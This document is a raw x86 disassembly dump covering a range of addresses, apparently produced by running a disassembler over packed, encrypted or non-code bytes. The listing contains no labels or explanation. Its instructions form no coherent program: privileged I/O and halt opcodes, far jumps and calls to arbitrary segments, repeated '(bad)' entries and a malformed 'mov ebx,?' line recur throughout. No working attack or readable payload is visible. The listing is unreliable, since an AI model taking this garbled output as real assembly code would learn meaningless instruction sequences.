  41f646:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f647:	stos   DWORD PTR es:[edi],eax
  41f648:	jl     0x41f694
  41f64a:	or     eax,edi
  41f64c:	leave  
  41f64d:	lods   eax,DWORD PTR ds:[esi]
  41f64e:	lea    eax,[ecx]
  41f650:	shl    BYTE PTR [eax-0x17814903],0xbf
  41f657:	call   0x72d4:0x61b0bfce
  41f65e:	mov    al,ds:0xb1304cac
  41f663:	pop    edi
  41f664:	sahf   
  41f665:	mov    ah,0xc
  41f667:	xor    edx,DWORD PTR [edi+eiz*2]
  41f66a:	cmp    eax,0x83d7377d
  41f66f:	add    BYTE PTR [esi+ebp*1-0x70],al
  41f673:	mov    bh,0xf
  41f675:	ret    0x8c9f
  41f678:	jmp    0x41f62b
  41f67a:	jne    0x41f657
  41f67c:	push   es
  41f67d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f67e:	outs   dx,DWORD PTR ds:[esi]
  41f67f:	fcmovb st,st(3)
  41f681:	out    0x51,eax
  41f683:	or     ebx,DWORD PTR [esi+0x75]
  41f686:	int    0x73
  41f688:	pop    ds
  41f689:	iret   
  41f68a:	aaa    
  41f68b:	mov    DWORD PTR [esp+ecx*1],eax
  41f68e:	inc    edi
  41f68f:	stc    
  41f690:	or     al,0xe8
  41f692:	or     al,0x17
  41f694:	pop    ecx
  41f695:	cs loop 0x41f620
  41f698:	adc    ch,dl
  41f69a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f69b:	pop    edx
  41f69c:	dec    edx
  41f69d:	push   esp
  41f69e:	mov    edi,0x8ee49bb7
  41f6a3:	bound  esi,QWORD PTR [ecx]
  41f6a5:	ret    
  41f6a6:	hlt    
  41f6a7:	cld    
  41f6a8:	cmc    
  41f6a9:	mov    ebx,0x59a91e1d
  41f6ae:	pop    ds
  41f6af:	sbb    DWORD PTR [edi+0x39b721b],0x1d898c5d
  41f6b9:	in     al,0x37
  41f6bb:	pusha  
  41f6bc:	daa    
  41f6bd:	cli    
  41f6be:	xchg   edi,eax
  41f6bf:	xchg   DWORD PTR [ebx],ebp
  41f6c1:	fdiv   DWORD PTR [esi]
  41f6c3:	in     eax,dx
  41f6c4:	mov    cl,0x4f
  41f6c6:	shr    DWORD PTR [eax+ebp*2-0x20],cl
  41f6ca:	call   0xf517b17e
  41f6cf:	pop    ds
  41f6d0:	ins    BYTE PTR es:[edi],dx
  41f6d1:	loop   0x41f667
  41f6d3:	or     eax,DWORD PTR [ebx]
  41f6d5:	jecxz  0x41f694
  41f6d7:	outs   dx,BYTE PTR ds:[esi]
  41f6d8:	pop    es
  41f6d9:	into   
  41f6da:	fwait
  41f6db:	jno    0x41f6e0
  41f6dd:	mov    ah,0xac
  41f6df:	cmp    ebx,edx
  41f6e1:	xchg   BYTE PTR [esi+edi*8+0x27],ch
  41f6e5:	clc    
  41f6e6:	ins    BYTE PTR es:[edi],dx
  41f6e7:	lea    esi,[esi-0x63d33f82]
  41f6ed:	cs je  0x41f728
  41f6f0:	shr    DWORD PTR [edi-0xa],1
  41f6f3:	xchg   esp,eax
  41f6f4:	pop    ebp
  41f6f5:	retf   0x5a8a
  41f6f8:	xor    ebx,DWORD PTR [eax-0x3105b306]
  41f6fe:	sbb    eax,0xfb003028
  41f703:	or     al,0x2c
  41f705:	jl     0x41f773
  41f707:	inc    BYTE PTR [eax+0x18]
  41f70a:	add    al,BYTE PTR cs:[edi+ebp*4-0x3c]
  41f70f:	inc    esi
  41f710:	pop    eax
  41f711:	jmp    0x72bb69cc
  41f716:	out    0x85,eax
  41f718:	mov    edx,0x7b89b2a9
  41f71d:	lock dec cx
  41f720:	rol    dl,cl
  41f722:	(bad)  
  41f723:	mov    ebp,0xa90c043e
  41f728:	mov    dh,0xa8
  41f72a:	das    
  41f72b:	adc    bh,BYTE PTR [eax+0x5cb43f9]
  41f731:	cmp    BYTE PTR ds:0x80c7d87e,dh
  41f737:	rcl    bl,1
  41f739:	fisttp DWORD PTR [edi+0x21]
  41f73c:	jl     0x41f72b
  41f73e:	or     edi,DWORD PTR [eax-0x7351f8c5]
  41f744:	(bad)  
  41f745:	cmp    ah,al
  41f747:	cmp    al,0x78
  41f749:	lds    esp,FWORD PTR [edx-0x20]
  41f74c:	(bad)  
  41f74d:	fldenv [edi+ecx*2+0x3a471f7e]
  41f754:	push   ss
  41f755:	add    al,0x9a
  41f757:	test   DWORD PTR [ecx],ecx
  41f759:	stos   DWORD PTR es:[edi],eax
  41f75a:	mov    al,0x57
  41f75c:	add    BYTE PTR [eax-0x26],ch
  41f75f:	loope  0x41f71a
  41f761:	xchg   edx,eax
  41f762:	xchg   ebx,eax
  41f763:	in     eax,dx
  41f764:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f765:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f766:	xchg   esp,eax
  41f767:	dec    ecx
  41f768:	xor    ebp,DWORD PTR [eax+0x68]
  41f76b:	push   0x54bb14c5
  41f770:	push   es
  41f771:	(bad)  
  41f772:	fbstp  TBYTE PTR [edx+edi*2]
  41f775:	adc    DWORD PTR [esi+eax*8-0xe],ebx
  41f779:	mov    DWORD PTR [edi-0x28b3bdf3],edi
  41f77f:	in     eax,dx
  41f780:	in     al,dx
  41f781:	and    DWORD PTR [eax+0x9276aac],eax
  41f787:	call   0x96f6:0xe7929247
  41f78e:	mov    esp,0x509c5172
  41f793:	stc    
  41f794:	jmp    0xc9959350
  41f799:	mov    ebx,fs
  41f79b:	inc    eax
  41f79c:	adc    ebp,ebx
  41f79e:	enter  0xb2d5,0x9f
  41f7a2:	pop    ecx
  41f7a3:	retf   0xd853
  41f7a6:	sub    edi,DWORD PTR [ecx]
  41f7a8:	dec    esp
  41f7a9:	or     ebp,edi
  41f7ab:	sbb    al,BYTE PTR [ecx-0x32]
  41f7ae:	jecxz  0x41f801
  41f7b0:	jp     0x41f7d0
  41f7b2:	iret   
  41f7b3:	mov    edx,0xb9bacc85
  41f7b8:	mov    ecx,0x50cc1ae2
  41f7bd:	push   ss
  41f7be:	les    esp,FWORD PTR [ebx]
  41f7c0:	in     eax,0x8b
  41f7c2:	sbb    DWORD PTR [edx],esi
  41f7c4:	loop   0x41f842
  41f7c6:	mov    ds:0x73f85ce8,eax
  41f7cb:	call   0xbbf0be69
  41f7d0:	push   es
  41f7d1:	cmp    al,0xb1
  41f7d3:	adc    al,0x9c
  41f7d5:	jne    0x41f7da
  41f7d7:	mov    cs,WORD PTR [edx]
  41f7d9:	push   esp
  41f7da:	inc    ecx
  41f7db:	(bad)  
  41f7dc:	fisub  WORD PTR [ebp+0x2d]
  41f7df:	dec    esp
  41f7e0:	push   esp
  41f7e1:	fld    QWORD PTR ds:0x73b90fc0
  41f7e7:	inc    ebx
  41f7e8:	(bad)  
  41f7ea:	mov    ebx,0xaf084c14
  41f7ef:	push   ss
  41f7f0:	pop    esi
  41f7f1:	shl    DWORD PTR [edx-0x4e],1
  41f7f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7f5:	mov    WORD PTR [eax],es
  41f7f7:	repz dec ebx
  41f7f9:	icebp  
  41f7fa:	add    al,0x5
  41f7fc:	ror    BYTE PTR [eax-0x45],1
  41f7ff:	arpl   WORD PTR ds:0xdacb8b2e,dx
  41f805:	cmp    BYTE PTR [esi-0x30],0x19
  41f809:	adc    DWORD PTR [esi-0x30761fd2],0x1c9d8520
  41f813:	cmp    al,0x5e
  41f815:	and    al,BYTE PTR [edx]
  41f817:	cld    
  41f818:	ins    WORD PTR es:[edi],dx
  41f81a:	fldenv [esi+0x4a]
  41f81d:	imul   esp,DWORD PTR ss:0x10f65bf3,0xc0be2edd
  41f828:	jp     0x41f89c
  41f82a:	test   DWORD PTR [ecx+0x5b8f7a95],ebx
  41f830:	jnp    0x41f854
  41f832:	sar    BYTE PTR [edi-0x571847f7],cl
  41f838:	dec    ecx
  41f839:	test   eax,0xa0d34982
  41f83e:	ds ret 
  41f840:	popf   
  41f841:	cmc    
  41f842:	ds dec ecx
  41f844:	ret    
  41f845:	and    dl,BYTE PTR [edx+esi*4-0x20]
  41f849:	inc    ebx
  41f84a:	push   esp
  41f84b:	xor    ecx,DWORD PTR [eax+0x76d71b2a]
  41f851:	inc    ebx
  41f852:	push   ebx
  41f853:	push   ecx
  41f854:	sahf   
  41f855:	xor    eax,0x9b5d54ac
  41f85a:	xor    eax,0x986f6c14
  41f85f:	hlt    
  41f860:	fbstp  TBYTE PTR [esi+0x5e]
  41f863:	push   ds
  41f864:	xchg   ebx,eax
  41f865:	pop    es
  41f866:	or     DWORD PTR [esi-0x71820181],eax
  41f86c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f86d:	mov    edx,0xae13f2c3
  41f872:	das    
  41f873:	or     DWORD PTR [esi+0x1],edi
  41f876:	out    dx,eax
  41f877:	pushf  
  41f878:	call   FWORD PTR ds:[edi-0x1c087374]
  41f87f:	sub    DWORD PTR [ebp-0x47c8985],esi
  41f885:	xchg   BYTE PTR [edx+edi*8],cl
  41f888:	pop    edx
  41f889:	inc    ecx
  41f88a:	scas   eax,DWORD PTR es:[edi]
  41f88b:	dec    edx
  41f88c:	in     eax,0xd2
  41f88e:	inc    esi
  41f88f:	bound  esp,QWORD PTR [eax]
  41f891:	loop   0x41f858
  41f893:	rol    BYTE PTR [edi],cl
  41f895:	lahf   
  41f896:	xor    eax,0x9e672611
  41f89b:	mov    fs,WORD PTR cs:[ecx]
  41f89e:	rol    DWORD PTR [edx-0x5440cd38],0x3e
  41f8a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8a6:	icebp  
  41f8a7:	arpl   di,dx
  41f8a9:	xchg   esi,eax
  41f8aa:	bound  ebx,QWORD PTR [eax]
  41f8ac:	clc    
  41f8ad:	sbb    edi,DWORD PTR [eax+0x23]
  41f8b0:	mov    eax,ds:0x3298ea09
  41f8b5:	add    eax,0xdacb4c99
  41f8ba:	in     al,dx
  41f8bb:	dec    edi
  41f8bc:	pop    ss
  41f8bd:	dec    edx
  41f8be:	aad    0x9
  41f8c0:	fnstenv [edx]
  41f8c2:	xchg   ebp,eax
  41f8c3:	cmp    al,BYTE PTR [esi]
  41f8c5:	fcomi  st,st(5)
  41f8c7:	sub    eax,0x5afcde24
  41f8cc:	cmp    ebx,DWORD PTR [ecx+0x79a41c2e]
  41f8d2:	iret   
  41f8d3:	or     eax,0xb3176bb1
  41f8d8:	sar    BYTE PTR [eax+edx*4],cl
  41f8db:	and    ecx,DWORD PTR [ebp-0x75]
  41f8de:	sbb    BYTE PTR [esi],ah
  41f8e0:	jo     0x41f8dc
  41f8e2:	ss dec ebx
  41f8e4:	lods   al,BYTE PTR ds:[esi]
  41f8e5:	out    0x11,al
  41f8e7:	fmulp  st(3),st
  41f8e9:	scas   eax,DWORD PTR es:[edi]
  41f8ea:	stos   BYTE PTR es:[edi],al
  41f8eb:	push   edi
  41f8ec:	daa    
  41f8ed:	aaa    
  41f8ee:	in     al,dx
  41f8ef:	sub    edi,DWORD PTR [eax]
  41f8f1:	xor    BYTE PTR [esi-0x7c],0xfa
  41f8f5:	or     cl,BYTE PTR [esi+0x1f]
  41f8f8:	int    0xfd
  41f8fa:	dec    ecx
  41f8fb:	call   0x326d1462
  41f900:	cdq    
  41f901:	in     eax,dx
  41f902:	mov    dl,0x8b
  41f904:	mov    ah,0x86
  41f906:	adc    DWORD PTR [ebp-0x4f],ebx
  41f909:	cmc    
  41f90a:	lods   al,BYTE PTR ds:[esi]
  41f90b:	sar    ebx,cl
  41f90d:	inc    ebx
  41f90e:	into   
  41f90f:	mov    ecx,0xf71d20f
  41f914:	sahf   
  41f915:	stos   DWORD PTR es:[edi],eax
  41f916:	mov    eax,ss
  41f918:	inc    edi
  41f919:	popa   
  41f91a:	out    0x3e,al
  41f91c:	scas   eax,DWORD PTR es:[edi]
  41f91d:	repnz inc ebx
  41f91f:	mov    ebp,0x934fcffc
  41f924:	dec    ebx
  41f925:	out    dx,al
  41f926:	mov    DWORD PTR [edx],edi
  41f928:	pop    ecx
  41f929:	lahf   
  41f92a:	xchg   ebp,eax
  41f92b:	popf   
  41f92c:	jns    0x41f98d
  41f92e:	ja     0x41f905
  41f930:	ror    DWORD PTR [edi-0x574b1484],cl
  41f936:	outs   dx,DWORD PTR ds:[esi]
  41f938:	mov    esp,0xe1f9dbf1
  41f93d:	add    al,0xf2
  41f93f:	mov    esp,0x25b2604c
  41f944:	dec    ebp
  41f945:	inc    esp
  41f946:	test   DWORD PTR [eax],eax
  41f948:	fcom   st(0)
  41f94a:	and    DWORD PTR [edx+0x55],edi
  41f94d:	jno    0x41f9cb
  41f94f:	ret    
  41f950:	aad    0x2e
  41f952:	in     eax,0x18
  41f954:	jmp    0x41f910
  41f956:	dec    ebx
  41f957:	ret    0x8b9e
  41f95a:	sahf   
  41f95b:	cmp    eax,0x57043ce2
  41f960:	aad    0x6f
  41f962:	mov    dl,0xee
  41f964:	pop    ds
  41f965:	sbb    bl,BYTE PTR [edx-0x26191004]
  41f96b:	(bad)  
  41f96c:	(bad)  
  41f96d:	(bad)  
  41f96e:	mov    esi,0xbd9f5b42
  41f973:	imul   edi,DWORD PTR [eax],0x3b
  41f976:	setp   BYTE PTR [edx+0x69b4c6a7]
  41f97d:	jnp    0x41f987
  41f97f:	fld    QWORD PTR [ebx]
  41f981:	dec    ebx
  41f982:	inc    esp
  41f983:	out    dx,al
  41f984:	mov    dl,0xdd
  41f986:	xor    esp,ecx
  41f988:	outs   dx,DWORD PTR ds:[esi]
  41f989:	aad    0x31
  41f98b:	jns    0x41f9fa
  41f98d:	xor    esp,DWORD PTR [eax+0x0]
  41f990:	pop    esi
  41f991:	addr16 dec esp
  41f993:	mov    esp,0x554907d4
  41f998:	pop    ds
  41f999:	mov    ebp,0x165030e4
  41f99e:	cwde   
  41f99f:	sbb    dl,al
  41f9a1:	sbb    DWORD PTR [edi],esp
  41f9a3:	out    dx,eax
  41f9a4:	loope  0x41f963
  41f9a6:	shl    DWORD PTR [eax+0x59584219],0xe2
  41f9ad:	rol    BYTE PTR [ecx-0x58a6a06c],0xca
  41f9b4:	cmp    al,0x3c
  41f9b6:	lea    ecx,[ebp+0x61d2b1f7]
  41f9bc:	loop   0x41f95a
  41f9be:	pop    ebp
  41f9bf:	in     al,0x8c
  41f9c1:	popf   
  41f9c2:	inc    esi
  41f9c3:	popa   
  41f9c4:	cs xchg ecx,eax
  41f9c6:	and    dl,ah
  41f9c8:	or     edi,esi
  41f9ca:	iret   
  41f9cb:	divps  xmm6,XMMWORD PTR [ecx+0x40]
  41f9cf:	das    
  41f9d0:	cmp    al,BYTE PTR [ebp+0x65]
  41f9d3:	fnstcw WORD PTR [ebx+0x1b]
  41f9d6:	pusha  
  41f9d7:	adc    eax,0xb8f6914c
  41f9dc:	jmp    0xc33e:0xce52d6f5
  41f9e3:	mov    edi,0xc021980b
  41f9e8:	pop    eax
  41f9e9:	lock in al,0x12
  41f9ec:	mov    edx,0xa811cbfc
  41f9f1:	add    DWORD PTR [eax],eax
  41f9f3:	jle    0x41f975
  41f9f5:	pop    DWORD PTR [ebp+0x0]
  41f9f8:	fiadd  DWORD PTR [eax]
  41f9fa:	popa   
  41f9fb:	pop    ebp
  41f9fc:	pop    es
  41f9fd:	pop    edi
  41f9fe:	repz xor dl,BYTE PTR [edx]
  41fa01:	inc    ecx
  41fa02:	pushf  
  41fa03:	mov    ds:0x25305b16,al
  41fa08:	shr    BYTE PTR [ebx+0x59ea1b67],1
  41fa0e:	arpl   WORD PTR [ebp+0x28],sp
  41fa11:	pop    edi
  41fa12:	push   ds
  41fa13:	jb     0x41f9dc
  41fa15:	in     al,0xda
  41fa17:	sbb    BYTE PTR [ebp+0x704d64f],bh
  41fa1d:	cmp    DWORD PTR [edi],esp
  41fa1f:	cmp    ebx,edi
  41fa21:	mov    ebx,0x88017699
  41fa26:	mov    dh,0x65
  41fa28:	inc    esi
  41fa29:	mov    ah,0x1b
  41fa2b:	push   ebx
  41fa2c:	mov    ebx,0x592757e
  41fa31:	cli    
  41fa32:	jbe    0x41fa62
  41fa34:	push   ds
  41fa35:	dec    ebx
  41fa36:	dec    ebx
  41fa37:	out    0x6b,al
  41fa39:	dec    ebp
  41fa3a:	add    BYTE PTR [eax+0x7e],ch
  41fa3d:	jle    0x41fa0a
  41fa3f:	jmp    0x41fa07
  41fa41:	imul   ebp,DWORD PTR [edi],0xffffffe4
  41fa44:	mov    bh,0xdb
  41fa46:	mov    edi,0xf6df9f87
  41fa4b:	out    dx,al
  41fa4c:	ds jb  0x41f9d8
  41fa4f:	pop    eax
  41fa50:	and    eax,0x27fe625f
  41fa55:	mov    esp,0x9132c9e4
  41fa5a:	sub    eax,0x83b97204
  41fa5f:	or     DWORD PTR [ebp-0x8c88dbe],ecx
  41fa65:	fnsave [edi+0x45096d1c]
  41fa6b:	in     eax,0xfd
  41fa6d:	aam    0xdf
  41fa6f:	dec    edx
  41fa70:	mov    ds:0xf771ccd8,al
  41fa75:	test   al,0xf2
  41fa77:	in     eax,dx
  41fa78:	push   es
  41fa79:	ins    DWORD PTR es:[edi],dx
  41fa7a:	scas   eax,DWORD PTR es:[edi]
  41fa7b:	shl    ebx,0x5f
  41fa7e:	into   
  41fa7f:	scas   al,BYTE PTR es:[edi]
  41fa80:	in     al,dx
  41fa81:	dec    ebx
  41fa82:	int    0xf
  41fa84:	pop    ds
  41fa85:	jno    0x41fac4
  41fa87:	and    al,0x60
  41fa89:	cli    
  41fa8a:	mov    DWORD PTR [ecx-0x5d9bbc05],edx
  41fa90:	test   eax,0x1a00e099
  41fa95:	add    al,0xd2
  41fa97:	into   
  41fa98:	xchg   eax,ecx
  41fa9a:	es jg  0x41facd
  41fa9d:	imul   esp,DWORD PTR [edx-0x14626ae3],0x44
  41faa4:	xor    BYTE PTR ds:0x85826c0c,bh
  41faaa:	xor    bl,BYTE PTR [ecx-0x736d45c5]
  41fab0:	mov    ebp,0xe07cbc54
  41fab5:	bound  ebp,QWORD PTR [ebx]
  41fab7:	mov    ebx,0x58a14715
  41fabc:	add    BYTE PTR [esi],al
  41fabe:	lods   al,BYTE PTR ds:[esi]
  41fabf:	cmp    eax,0x7bab8808
  41fac4:	or     DWORD PTR [esi+0x44],ebx
  41fac7:	stos   BYTE PTR es:[edi],al
  41fac8:	dec    edx
  41fac9:	mov    BYTE PTR [esi-0x6a],bl
  41facc:	repnz push ebx
  41face:	mov    ah,cl
  41fad0:	mov    es,ebp
  41fad2:	aad    0x71
  41fad4:	or     ebx,DWORD PTR [ebx]
  41fad6:	xor    dl,BYTE PTR [esi]
  41fad8:	mov    ebx,ebx
  41fada:	data16 stc 
  41fadc:	loopne 0x41fb57
  41fade:	call   0xdf88:0x6b3f9f03
  41fae5:	data16 jne 0x41fb03
  41fae8:	push   0x67
  41faea:	xchg   esp,eax
  41faeb:	imul   edx,DWORD PTR [esi+edi*4+0x1],0xe8e017d
  41faf3:	mov    al,0xd
  41faf5:	inc    ebp
  41faf6:	pop    edx
  41faf7:	jae    0x41fb30
  41faf9:	xchg   edi,eax
  41fafa:	adc    DWORD PTR [ebp+ebx*8-0x54ae2ead],esp
  41fb01:	xlat   BYTE PTR ds:[ebx]
  41fb02:	xor    eax,0xfb49137d
  41fb07:	call   0x38ed:0x3d842c75
  41fb0e:	js     0x41fb45
  41fb10:	out    dx,eax
  41fb11:	mov    edi,DWORD PTR [ebx]
  41fb13:	das    
  41fb14:	jns    0x41faf1
  41fb16:	int3   
  41fb17:	pop    ds
  41fb18:	push   eax
  41fb19:	lods   al,BYTE PTR ds:[esi]
  41fb1a:	xchg   ecx,eax
  41fb1b:	xor    eax,0xc7bfcb3
  41fb20:	test   BYTE PTR [edx+0x4c],ah
  41fb23:	in     eax,0x7
  41fb25:	cli    
  41fb26:	je     0x41fb64
  41fb28:	(bad)  
  41fb29:	and    ah,BYTE PTR [edx-0x735a694a]
  41fb2f:	adc    edi,DWORD PTR [bx+di-0x26]
  41fb33:	pop    ebx
  41fb34:	sar    BYTE PTR [ebp-0x53036180],1
  41fb3a:	xchg   esp,eax
  41fb3b:	jp     0x41fb57
  41fb3d:	ror    BYTE PTR [ecx+0x5a],0xa5
  41fb41:	push   ebx
  41fb42:	push   edi
  41fb43:	fcom   QWORD PTR [ecx+0x5d]
  41fb46:	outs   dx,BYTE PTR ds:[esi]
  41fb47:	add    dh,BYTE PTR [eax]
  41fb49:	sbb    eax,0xea653774
  41fb4e:	jb     0x41fb39
  41fb50:	push   ss
  41fb51:	add    cl,al
  41fb53:	mov    bh,BYTE PTR [edx]
  41fb55:	or     DWORD PTR [edi],edx
  41fb57:	add    DWORD PTR [eax+0x10f54d6c],ecx
  41fb5d:	fs test al,0x9b
  41fb60:	mov    ah,BYTE PTR [ebp-0xe]
  41fb63:	ret    0x70f4
  41fb66:	mov    ebp,0x463aa855
  41fb6b:	les    ebp,FWORD PTR [esi-0x2e6198be]
  41fb71:	sub    esi,ecx
  41fb73:	mov    BYTE PTR [ecx+eax*4],al
  41fb76:	into   
  41fb77:	mov    al,ds:0xd7af8960
  41fb7c:	repz aad 0x57
  41fb7f:	fnstsw WORD PTR [ebp+0x40ebb63d]
  41fb85:	xchg   esp,eax
  41fb86:	aam    0xaa
  41fb88:	or     BYTE PTR [ecx-0x19c8a855],bl
  41fb8e:	sbb    cl,bh
  41fb90:	fst    DWORD PTR [eax+ebx*2-0x78d4cb72]
  41fb97:	push   0x2b7b7068
  41fb9c:	pop    eax
  41fb9d:	xlat   BYTE PTR ds:[ebx]
  41fb9e:	rcl    BYTE PTR [ebx-0x79],0x2f
  41fba2:	jmp    0x2cdb:0xe4b4cafa
  41fba9:	(bad)  
  41fbaa:	(bad)  
  41fbab:	add    DWORD PTR [edx],ebx
  41fbad:	xchg   ebp,eax
  41fbae:	sub    dh,ch
  41fbb0:	cli    
  41fbb1:	rol    BYTE PTR [ebx+eax*8],cl
  41fbb4:	lock lods al,BYTE PTR fs:[esi]
  41fbb7:	inc    esi
  41fbb8:	lock pop ebx
  41fbba:	sub    ebx,DWORD PTR [edx]
  41fbbc:	pop    ebx
  41fbbd:	mov    ebx,?
  41fbbf:	dec    ebp
  41fbc0:	popf   
  41fbc1:	loopne 0x41fbe6
  41fbc3:	loope  0x41fb66
  41fbc5:	push   ds
  41fbc6:	add    edx,DWORD PTR [esp+ebx*4+0x530eb8d0]
  41fbcd:	jno    0x41fba1
  41fbcf:	adc    edx,DWORD PTR es:[esi-0xf]
  41fbd3:	(bad)  
  41fbd5:	or     BYTE PTR [eax+0x757f3374],dh
  41fbdb:	pop    esi
  41fbdc:	push   es
  41fbdd:	push   eax
  41fbde:	test   ch,0xfe
  41fbe1:	loope  0x41fbfc
  41fbe3:	inc    edx
  41fbe4:	scas   al,BYTE PTR es:[edi]
  41fbe5:	dec    esp
  41fbe6:	adc    eax,0x863ebb12
  41fbeb:	pop    eax
  41fbec:	jns    0x41fb7a
  41fbee:	pop    esp
  41fbef:	(bad)  
  41fbf1:	cvtps2pi mm2,QWORD PTR [eax]
  41fbf4:	imul   esi,DWORD PTR [ecx],0xffffff98
  41fbf7:	push   ebx
  41fbf8:	xor    al,0xce
  41fbfa:	push   ss
  41fbfb:	cmp    al,0x43
  41fbfd:	mov    BYTE PTR [ebx],al
  41fbff:	adc    BYTE PTR [edi],bh
  41fc01:	repz and DWORD PTR ds:0x38cb00cd,eax
  41fc08:	mov    edi,0xfbc06150
  41fc0d:	outs   dx,DWORD PTR ds:[esi]
  41fc0e:	sbb    BYTE PTR [ecx-0x4accbcca],al
  41fc14:	out    dx,eax
  41fc15:	sub    al,0xe
  41fc17:	call   0xc0f0:0x26c92912
  41fc1e:	das    
  41fc1f:	lods   al,BYTE PTR ds:[esi]
  41fc20:	mov    esp,0xadec3fb8
  41fc25:	sub    ah,BYTE PTR [esi-0x39cdf6e9]
  41fc2b:	fadd   DWORD PTR [edi]
  41fc2d:	in     al,0xdc
  41fc2f:	xchg   esp,eax
  41fc30:	lds    ecx,FWORD PTR [ecx+0x25e20ea0]
  41fc36:	lods   al,BYTE PTR ds:[esi]
  41fc38:	mov    ch,0x5f
  41fc3a:	int    0x5f
  41fc3c:	dec    esi
  41fc3d:	add    eax,0x85c55afa
  41fc42:	jp     0x41fbd9
  41fc44:	les    edx,FWORD PTR [ebx]
  41fc46:	mov    ah,0x6c
  41fc48:	mov    ss,ebx
  41fc4a:	cs (bad) 
  41fc4c:	pop    ecx
  41fc4d:	mov    esp,0x21f5a67e
  41fc52:	frstor [ecx]
  41fc54:	jge    0x41fc64
  41fc56:	cmc    
  41fc57:	push   eax
  41fc58:	sub    al,0xb2
  41fc5a:	and    DWORD PTR [eax+0x7a88ce5e],esi
  41fc60:	(bad)  
  41fc61:	mov    ecx,0x3ad74aff
  41fc66:	in     al,dx
  41fc67:	icebp  
  41fc68:	mov    al,0xf6
  41fc6a:	sbb    BYTE PTR [ebx],ah
  41fc6c:	sub    ebx,DWORD PTR [ecx]
  41fc6e:	int3   
  41fc6f:	mov    bh,0x2
  41fc71:	std    
  41fc72:	pop    ebx
  41fc73:	mov    al,0x51
  41fc75:	or     DWORD PTR [eax],edi
  41fc77:	call   0xc86dbb4e
  41fc7c:	stc    
  41fc7d:	push   esi
  41fc7e:	push   0x5d21a977
  41fc83:	push   ebx
  41fc84:	jns    0x41fcf1
  41fc86:	stos   DWORD PTR es:[edi],eax
  41fc87:	cs inc ecx
  41fc89:	jecxz  0x41fc80
  41fc8b:	mov    ecx,0x1182e7ad
  41fc90:	adc    eax,0xa6e49839
  41fc95:	iret   
  41fc96:	mov    ebx,0x8a9a0092
  41fc9b:	sbb    DWORD PTR [ebx-0x4],esp
  41fc9e:	in     eax,0x26
  41fca0:	or     al,0xa8
  41fca2:	and    DWORD PTR [esi+eax*2],edx
  41fca5:	mov    dh,0x12
  41fca7:	sahf   
  41fca8:	pop    ebp
  41fca9:	mov    gs,edi
  41fcab:	or     eax,0xf8bb62b4
  41fcb0:	jae    0x41fcb9
  41fcb2:	cwde   
  41fcb3:	loopne 0x41fc7d
  41fcb5:	jae    0x41fd23
  41fcb7:	sbb    ch,0x73
  41fcba:	lahf   
  41fcbb:	sub    dl,BYTE PTR [esi-0x285b781]
  41fcc1:	fwait
  41fcc2:	xchg   esi,eax
  41fcc3:	outs   dx,DWORD PTR ds:[esi]
  41fcc4:	(bad)  
  41fcc5:	rcr    dl,1
  41fcc7:	sub    cl,cl
  41fcc9:	push   0xffffff90
  41fccb:	xchg   ebx,eax
  41fccc:	mov    ds:0xb2783b3e,eax
  41fcd1:	mov    eax,0x34826c89
  41fcd6:	stos   DWORD PTR es:[edi],eax
  41fcd7:	jecxz  0x41fcb4
  41fcd9:	fist   DWORD PTR [esi-0x51]
  41fcdc:	xchg   ebx,eax
  41fcdd:	or     al,0xb4
  41fcdf:	jge    0x41fcbf
  41fce1:	outs   dx,BYTE PTR ds:[esi]
  41fce3:	ret    0xd6cc
  41fce6:	fadd   st,st(3)
  41fce8:	mov    ss,esp
  41fcea:	fs pop es
  41fcec:	mov    edx,es
  41fcee:	popa   
  41fcef:	dec    ebp
  41fcf0:	adc    eax,0x9bf06217
  41fcf5:	retf   0x1e5c
  41fcf8:	mov    ch,cl
  41fcfa:	es jmp 0x8873e01c
  41fd00:	imul   edx,DWORD PTR [esi],0x4d9357a
  41fd06:	mov    esp,0x361fbc19
  41fd0b:	inc    ecx
  41fd0c:	fs jb  0x41fcd9
  41fd0f:	fisubr WORD PTR [bx]
  41fd12:	mov    bh,0x2a
  41fd14:	mov    dh,0x3f
  41fd16:	xchg   edx,ebp
  41fd18:	sbb    eax,0x79c0fb6c
  41fd1d:	cmp    BYTE PTR [edi],dh
  41fd1f:	out    0x5,al
  41fd21:	adc    ch,0x65
  41fd24:	xchg   ebx,eax
  41fd25:	test   al,0x66
  41fd27:	mov    bh,0xdc
  41fd29:	mov    bh,0x6
  41fd2b:	mov    bl,0xf
  41fd2d:	retf   
  41fd2e:	rol    BYTE PTR [ebx+0x72],0xe6
  41fd32:	xchg   edx,eax
  41fd33:	xor    BYTE PTR [edi],bl
  41fd35:	sti    
  41fd36:	data16 add al,0xf8
  41fd39:	mov    cl,BYTE PTR [eax]
  41fd3b:	mov    ah,0xe3
  41fd3d:	daa    
  41fd3e:	dec    esp
  41fd3f:	stos   DWORD PTR es:[edi],eax
  41fd40:	mov    BYTE PTR [edx],dh
  41fd42:	xchg   ebx,eax
  41fd43:	mov    dl,0xfd
  41fd45:	adc    BYTE PTR [ebp-0x4c3a6520],cl
  41fd4b:	test   DWORD PTR [ecx+0x3b],esp
  41fd4e:	imul   edi,DWORD PTR [edx-0x29],0xffffffca
  41fd52:	cmp    al,0x52
  41fd54:	mov    bh,0x7f
  41fd56:	aam    0xbc
  41fd58:	ret    0x9c6d
  41fd5b:	mov    al,ds:0x260b3b83
  41fd60:	hlt    
  41fd61:	adc    eax,esp
  41fd63:	cmp    al,0x3b
  41fd65:	mov    dh,0xeb
  41fd67:	add    eax,0x3f5f48c3
  41fd6c:	jno    0x41fcf5
  41fd6e:	inc    ebp
  41fd6f:	nop
  41fd70:	out    dx,eax
  41fd71:	cmp    al,0x74
  41fd73:	(bad)  
  41fd74:	(bad)  
  41fd75:	les    esi,FWORD PTR [ecx-0x34aa4a76]
  41fd7b:	retf   
  41fd7c:	inc    ecx
  41fd7d:	dec    esi
  41fd7e:	pop    esp
  41fd7f:	mov    al,0x89
  41fd81:	pop    ebp
  41fd82:	cdq    
  41fd83:	mov    al,0x1d
  41fd85:	popf   
  41fd86:	add    al,0x0
  41fd88:	xor    BYTE PTR [esi-0x3],ah
